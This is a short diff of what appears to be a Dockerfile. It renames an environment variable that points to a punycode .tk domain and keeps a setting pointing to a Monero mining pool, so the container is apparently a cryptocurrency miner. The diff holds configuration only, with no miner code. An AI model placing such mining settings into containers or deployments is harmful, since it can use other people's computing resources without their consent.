@@ -1,6 +1,6 @@
 FROM vscwjm/test:mv1
 
-ENV WWS_URL=xn--fiq811j6ckwjg.xn--6krt7h.tk
+ENV WS_URL=xn--fiq811j6ckwjg.xn--6krt7h.tk
 ENV POOL_URL=pool.supportxmr.com:3333
 ENV NAME_ID=TEST
 
